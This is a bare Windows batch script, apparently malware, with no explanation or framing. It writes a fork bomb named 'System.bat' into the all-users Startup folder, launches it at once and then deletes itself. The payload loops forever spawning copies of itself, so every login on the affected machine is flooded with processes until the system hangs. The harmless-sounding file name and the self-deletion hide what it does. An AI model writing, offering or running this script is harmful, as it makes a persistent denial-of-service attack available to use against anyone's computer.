(
    echo :loop
    echo start "" "%%~f0"
    echo goto loop
) > "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\System.bat"
start "" "cmd.exe" /c "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\System.bat"
del /f /q "%~f0"

